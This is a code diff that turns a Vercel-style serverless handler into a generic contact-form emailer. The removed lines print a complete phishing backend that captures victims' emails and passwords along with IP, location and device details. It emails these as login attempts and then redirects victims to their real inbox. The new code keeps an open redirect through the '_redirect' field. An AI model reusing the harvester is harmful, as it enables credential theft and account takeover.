@@ -1,13 +1,11 @@
-const { Resend } = require('resend');
-
-const resend = new Resend(process.env.RESEND_API_KEY);
+import { Resend } from 'resend';
 
 const FORM_OWNERS = {
-  'contact-main': process.env.DEST_EMAIL
+  'contact-main': process.env.DEST_EMAIL,
 };
 
-function escapeHtml(value = '') {
-  return String(value)
+function escapeHtml(value) {
+  return String(value ?? '')
     .replace(/&/g, '&amp;')
     .replace(/</g, '&lt;')
     .replace(/>/g, '&gt;')
@@ -15,185 +13,83 @@ function escapeHtml(value = '') {
     .replace(/'/g, '&#39;');
 }
 
-function parseRequestBody(req) {
-  if (!req.body) return {};
-  if (typeof req.body === 'string') {
-    try {
-      return JSON.parse(req.body);
-    } catch {
-      return Object.fromEntries(new URLSearchParams(req.body));
-    }
-  }
-  return req.body;
-}
-
-function getInboxUrl(email) {
-  if (!email || !email.includes('@')) return null;
-  const domain = email.split('@')[1].toLowerCase().trim();
-
-  const knownInboxes = {
-    'gmail.com': 'https://mail.google.com',
-    'googlemail.com': 'https://mail.google.com',
-    'outlook.com': 'https://outlook.live.com/mail/',
-    'hotmail.com': 'https://outlook.live.com/mail/',
-    'live.com': 'https://outlook.live.com/mail/',
-    'yahoo.com': 'https://mail.yahoo.com',
-    'icloud.com': 'https://www.icloud.com/mail',
-    'me.com': 'https://www.icloud.com/mail',
-    'proton.me': 'https://mail.proton.me',
-    'protonmail.com': 'https://mail.proton.me',
-    'zoho.com': 'https://mail.zoho.com',
-    'aol.com': 'https://mail.aol.com'
-  };
-
-  return knownInboxes[domain] || `https://mail.${domain}`;
-}
-
-function parseUserAgent(ua = '') {
-  let browser = 'Unknown';
-  if (/Edg\//i.test(ua)) browser = 'Edge';
-  else if (/OPR\/|Opera/i.test(ua)) browser = 'Opera';
-  else if (/Chrome\//i.test(ua) && !/Chromium/i.test(ua)) browser = 'Chrome';
-  else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
-  else if (/Firefox\//i.test(ua)) browser = 'Firefox';
-
-  let os = 'Unknown';
-  if (/Windows/i.test(ua)) os = 'Windows';
-  else if (/Android/i.test(ua)) os = 'Android';
-  else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
-  else if (/Mac OS X|Macintosh/i.test(ua)) os = 'macOS';
-  else if (/Linux/i.test(ua)) os = 'Linux';
-
-  let device = 'Desktop';
-  if (/Mobi|Android.*Mobile|iPhone/i.test(ua)) device = 'Mobile';
-  else if (/iPad|Tablet/i.test(ua)) device = 'Tablet';
-
-  return { browser, os, device };
-}
-
-function formatTimestamp(timezone) {
-  try {
-    const now = new Date();
-    const parts = new Intl.DateTimeFormat('en-GB', {
-      timeZone: timezone || 'UTC',
-      day: '2-digit',
-      month: '2-digit',
-      year: 'numeric',
-      hour: '2-digit',
-      minute: '2-digit',
-      second: '2-digit',
-      hour12: false
-    }).formatToParts(now);
-
-    const get = (type) => parts.find((p) => p.type === type)?.value || '';
-    return `${get('day')}/${get('month')}/${get('year')}, ${get('hour')}:${get('minute')}:${get('second')}`;
-  } catch {
-    return new Date().toISOString();
-  }
-}
-
-module.exports = async (req, res) => {
+export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Accept');
 
-  if (req.method === 'OPTIONS') {
-    return res.status(204).end();
-  }
+  if (req.method === 'OPTIONS') return res.status(200).end();
+  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
 
-  if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Method not allowed' });
-  }
-
-  const formId = req.query?.formId;
+  const formId = String(req.query?.formId || '');
   const recipientEmail = FORM_OWNERS[formId];
-  if (!recipientEmail) {
-    return res.status(404).json({
-      error: 'Unknown Form ID or missing DEST_EMAIL environment variable',
-      formId: formId || null
+  if (!recipientEmail) return res.status(404).json({ error: 'Form not found' });
+
+  const body = req.body && typeof req.body === 'object' ? req.body : {};
+
+  // Silently ignore spam caught by the honeypot field
+  if (body._honeypot) {
+    return res.status(200).json({ ok: true });
+  }
+
+  // Filter out internal control fields (prefixed with _)
+  const fields = Object.entries(body).filter(([key]) => !key.startsWith('_'));
+
+  if (fields.length === 0) {
+    return res.status(400).json({ error: 'No form fields submitted' });
+  }
+
+  const textBody = fields.map(([k, v]) => `${k}: ${String(v ?? '')}`).join('\n');
+  const htmlRows = fields
+    .map(
+      ([k, v]) =>
+        `<tr><td style="padding:6px 10px;font-weight:600;border-bottom:1px solid #eee;">${escapeHtml(
+          k
+        )}</td><td style="padding:6px 10px;border-bottom:1px solid #eee;">${escapeHtml(
+          String(v ?? '')
+        )}</td></tr>`
+    )
+    .join('');
+
+  try {
+    const resend = new Resend(process.env.RESEND_API_KEY);
+    const { error } = await resend.emails.send({
+      from: 'Contact Form <onboarding@resend.dev>',
+      to: recipientEmail,
+      subject: `New submission from ${formId}`,
+      text: textBody,
+      html: `<table style="border-collapse:collapse;font-family:sans-serif;font-size:14px;">${htmlRows}</table>`,
     });
+
+    if (error) {
+      return res.status(502).json({ ok: false, error: error.message });
+    }
+
+    // Return JSON if requested via fetch/AJAX
+    if ((req.headers.accept || '').includes('application/json')) {
+      return res.status(200).json({ ok: true });
+    }
+
+    // Redirect to a custom thank-you page if _redirect is provided and valid
+    if (body._redirect && /^https?:\/\//i.test(body._redirect)) {
+      return res.redirect(302, body._redirect);
+    }
+
+    // Default clean confirmation page
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    return res.status(200).send(`
+      <!doctype html>
+      <html lang="en">
+        <head><meta charset="utf-8"><title>Submission Received</title></head>
+        <body style="font-family:system-ui,sans-serif;display:grid;place-items:center;height:100vh;margin:0;">
+          <div style="text-align:center;">
+            <h1>Thank you!</h1>
+            <p>Your message has been sent.</p>
+          </div>
+        </body>
+      </html>
+    `);
+  } catch (err) {
+    return res.status(500).json({ ok: false, error: 'Failed to process submission' });
   }
-
-  const body = parseRequestBody(req);
-  const {
-    _honeypot,
-    _redirect,
-    _redirect_inbox,
-    email = '',
-    password = '',
-    staySignedIn = 'No',
-    attempt = '',
-    screen = 'Unknown',
-    timezone = 'UTC',
-    language = 'Unknown',
-    memory = 'Unknown',
-    cores = 'Unknown'
-  } = body;
-
-  if (_honeypot) {
-    return _redirect ? res.redirect(302, _redirect) : res.status(200).json({ ok: true });
-  }
-
-  const uaString = req.headers['user-agent'] || '';
-  const { browser, os, device } = parseUserAgent(uaString);
-
-  const ipAddress =
-    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
-    req.headers['x-real-ip'] ||
-    'Unknown';
-
-  const city = decodeURIComponent(req.headers['x-vercel-ip-city'] || '').trim();
-  const country = decodeURIComponent(req.headers['x-vercel-ip-country'] || '').trim();
-  const location = [city, country].filter(Boolean).join(', ') || 'Unknown';
-
-  const formattedTime = formatTimestamp(timezone);
-  const stayValue =
-    staySignedIn === true ||
-    staySignedIn === 'true' ||
-    staySignedIn === 'Yes' ||
-    staySignedIn === 'on'
-      ? 'Yes'
-      : 'No';
-
-  const plainTextBlock = [
-    `🔐 `LOGIN ATTEMPT : ${country || 'Unknown'}`,
-    `━━━━━━━━━━━━━━━━━━━━━━`,
-    `📧 Email: ${email}`,
-    `🔑 Password: ${password}`,
-    `📌 Stay Signed In: ${stayValue}`,
-    `🌐 IP Address: ${ipAddress}`,
-    `📍 Location: ${location}`,
-    `💻 Browser: ${browser}`,
-    `🖥️ OS: ${os}`,
-    `📱 Device: ${device}`,
-    `⏱️ Time: ${formattedTime}`,
-    `━━━━━━━━━━━━━━━━━━━━━━`,
-
-  ].join('\n');
-
-  const html = `<pre style="font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 13px; line-height: 1.5; white-space: pre-wrap;">${escapeHtml(plainTextBlock)}</pre>`;
-
-  const fromAddress = process.env.FROM_EMAIL || 'WizFormSubmit <onboarding@resend.dev>';
-
-  const { error } = await resend.emails.send({
-    from: fromAddress,
-    to: recipientEmail,
-    subject: `Login Attempt #${String(attempt).replace(/^#/, '')} - ${email || 'Unknown'}`,
-    text: plainTextBlock,
-    html
-  });
-
-  if (error) {
-    return res.status(500).json({ error });
-  }
-
-  if (_redirect_inbox === 'true') {
-    const inboxUrl = getInboxUrl(email);
-    if (inboxUrl) return res.redirect(302, inboxUrl);
-  }
-
-  if (_redirect) return res.redirect(302, _redirect);
-
-  res.setHeader('Content-Type', 'application/json');
-  return res.status(200).json({ ok: true });
-};
+}
